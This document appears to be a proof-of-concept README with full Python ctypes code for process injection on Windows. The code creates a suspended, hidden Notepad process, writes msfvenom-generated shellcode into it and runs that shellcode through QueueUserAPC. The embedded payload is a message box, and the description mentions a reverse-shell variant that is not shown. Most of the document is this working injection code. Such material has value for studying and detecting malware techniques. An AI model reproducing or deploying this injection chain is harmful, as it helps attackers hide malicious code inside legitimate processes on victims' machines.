# Process Creation and Shellcode Execution
## Description

This POC demonstrates how to create a new process (in this case, launching an instance of Notepad) and then inject and execute shellcode within that process. Essentially, the code shows a technique often used in malware or penetration testing—code injection—where executable code (shellcode) is written into the memory space of another process and then executed. The POC uses Python’s ctypes library to interface directly with Windows API functions.

## What the POC does
1. Process Creation:
  The code begins by creating a new process (Notepad.exe) using the Windows API call CreateProcessA. In many cases, the process is started in a suspended state (using flags such as CREATE_SUSPENDED), which gives the POC time to inject the shellcode before the process begins normal execution.

2. Memory Allocation in Remote Process:
  Using VirtualAllocEx, the POC allocates a block of memory in the target process (Notepad). This allocated memory will later hold the shellcode. The allocation is done with the combined flags MEM_COMMIT | MEM_RESERVE and initially set to PAGE_READWRITE.

3. Shellcode Injection:
  The shellcode, which is generated via tools like msfvenom, is stored as a byte string in the code. The function WriteProcessMemory writes this shellcode into the allocated memory within the remote process.

4. Changing Memory Protection:
  To allow the shellcode to be executed, the memory protection is changed from PAGE_READWRITE to PAGE_EXECUTE_READ using VirtualProtectEx. This is a critical step because Windows requires memory pages to have execute permissions if they are to be run as code.

5. Executing the Shellcode:
  Instead of directly creating a new thread to execute the shellcode (which is an option using CreateRemoteThread—although it’s commented out here), the POC uses QueueUserAPC (Asynchronous Procedure Call). An APC is queued to the suspended thread, pointing to the shellcode’s address. Finally, ResumeThread is called on the target process’s main thread, which then processes the queued APC and executes the shellcode.

6. Two Variants of Shellcode:
   1. Generic Shellcode: The first part of the code uses shellcode generated by msfvenom.
   2. Reverse Shell Payload: Later, the POC demonstrates a variant intended to provide a reverse shell. The reverse shell payload is also generated via msfvenom (with parameters like LHOST and LPORT to define the attacker’s IP and port).


## Code
   ```bash
from ctypes import *
from ctypes import wintypes
import subprocess

kernel32 = windll.kernel32
SIZE_T = c_size_t
LPTSTR = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

class _SECURITY_ATTRIBUTES(Structure):
	_fields_ = [('nlengths', wintypes.DWORD),
							('lpSecurityDescriptor', wintypes.LPVOID),
							('bInheritHandle', wintypes.BOOL),]
							
SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0X0
PROCESS_ALL_ACCESS = (0X000F0000 | 0X00100000 | 0X00000FFF)

VirtualProtectEx = kernel32.VirtualProtectEx
VirtualProtectEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.LPDWORD)
VirtualProtectEx.restype = wintypes.BOOL

# process = subprocess.Popen(["notepad.exe"])
# print("Starting process with PID => {}".format(process.pid))

class STARTUPINFO(Structure):
	_fields_ = [("cb", wintypes.DWORD),
							("lpReserved", LPTSTR),
							("lpDesktop", LPTSTR),
							("lpTitle", LPTSTR),
							("dwX", wintypes.DWORD),
							("dwY", wintypes.DWORD),
							("dwXSize", wintypes.DWORD),
							("dwYSize", wintypes.DWORD),
							("dwXCountChars", wintypes.DWORD),
							("dwYCountChars", wintypes.DWORD),
							("dwFillAttribute", wintypes.DWORD),
							("dwFlags", wintypes.DWORD),
							("wShowWindow", wintypes.WORD),
							("cbReserved2", wintypes.WORD),
							("lpReserved2", LPBYTE),
							("hStdInput", wintypes.HANDLE),
							("hStdOutput", wintypes.HANDLE),
							("hStdError", wintypes.HANDLE),]

class PROCESS_INFORMATION(Structure):
	_fields_ = [("hProcess", wintypes.HANDLE),
							("hThread", wintypes.HANDLE),
							("dwProcessId", wintypes.DWORD),
							("dwThreadId", wintypes.DWORD),]

CreateProcessA = kernel32.CreateProcessA
CreateProcessA.argtypes = (wintypes.LPCSTR, wintypes.LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION)) 
CreateProcessA.restype = wintypes.BOOL

#Now we use metasploit to develop our shellcode: msfvenom -a x64 -p windows/x64/messagebox TITLE=hello TEXT="This is you worst enemy :)" -f py
buf =  b""
buf += b"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00"
buf += b"\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65"
buf += b"\x48\x8b\x52\x60\x3e\x48\x8b\x52\x18\x3e\x48\x8b"
buf += b"\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48\x0f\xb7\x4a"
buf += b"\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
buf += b"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += b"\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
buf += b"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
buf += b"\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
buf += b"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31"
buf += b"\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75"
buf += b"\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd6"
buf += b"\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
buf += b"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
buf += b"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e"
buf += b"\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20"
buf += b"\x41\x52\xff\xe0\x58\x41\x59\x5a\x3e\x48\x8b\x12"
buf += b"\xe9\x49\xff\xff\xff\x5d\x3e\x48\x8d\x8d\x2f\x01"
buf += b"\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5\x49\xc7"
buf += b"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
buf += b"\x00\x3e\x4c\x8d\x85\x29\x01\x00\x00\x48\x31\xc9"
buf += b"\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41"
buf += b"\xba\xf0\xb5\xa2\x56\xff\xd5\x54\x68\x69\x73\x20"
buf += b"\x69\x73\x20\x79\x6f\x75\x20\x77\x6f\x72\x73\x74"
buf += b"\x20\x65\x6e\x65\x6d\x79\x20\x3a\x29\x00\x68\x65"
buf += b"\x6c\x6c\x6f\x00\x75\x73\x65\x72\x33\x32\x2e\x64"
buf += b"\x6c\x6c\x00"

def verify(x):
	if not x:
		raise WinError()
		
startup_info = STARTUPINFO()
startup_info.cb = sizeof(startup_info)

startup_info.dwFlags = 1
startup_info.wShowWindow = 1 #change the value to 0 if you want to hide the window

process_info = PROCESS_INFORMATION()

CREATE_NEW_CONSOLE = 0x00000010
CREATE_NO_WINDOW = 0x08000000
CREATE_SUSPENDED = 0x00000004

created = CreateProcessA(b"C:\\Windows\\System32\\notepad.exe", None, None, None, False, CREATE_SUSPENDED | CREATE_NO_WINDOW, None, None, byref(startup_info), byref(process_info))

verify(created)

pid = process_info.dwProcessId
h_process = process_info.hProcess
thread_id = process_info.dwThreadId
h_thread = process_info.hThread

print("Started process => Handle:{}, PID:{}, TID:{}".format(h_process, pid, thread_id))

remote_memory = VirtualAllocEx(h_process, False, len(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
verify(remote_memory)
print("Memory allocated => ", hex(remote_memory))

write = WriteProcessMemory(h_process, remote_memory, buf, len(buf), None)
verify(write)
print("Bytes written => {}".format(len(buf)))

PAGE_EXECUTE_READ = 0x20

old_protection = wintypes.DWORD(0)
protect = VirtualProtectEx(h_process, remote_memory, len(buf), PAGE_EXECUTE_READ, byref(old_protection))
verify(protect)
print("Memory protection updated from {} to {}".format(old_protection.value, PAGE_EXECUTE_READ))

#rthread = CreateRemoteThread(h_process, None, 0, remote_memory, None, EXECUTE_IMMEDIATELY, None)
#verify(rthread)

PAPCFUNC = CFUNCTYPE(None, POINTER(wintypes.ULONG))

QueueUserAPC = kernel32.QueueUserAPC
QueueUserAPC.argtypes = (PAPCFUNC, wintypes.HANDLE, POINTER(wintypes.ULONG))
QueueUserAPC.restype = wintypes.BOOL

ResumeThread = kernel32.ResumeThread
ResumeThread.argtypes = (wintypes.HANDLE, )
ResumeThread.restype = wintypes.BOOL

rqueue = QueueUserAPC(PAPCFUNC(remote_memory), h_thread, None)
verify(rqueue)
print("Queueing APC thread => {}".format(h_thread))

rthread = ResumeThread(h_thread)
verify(rthread)
print("Resuming thread!")
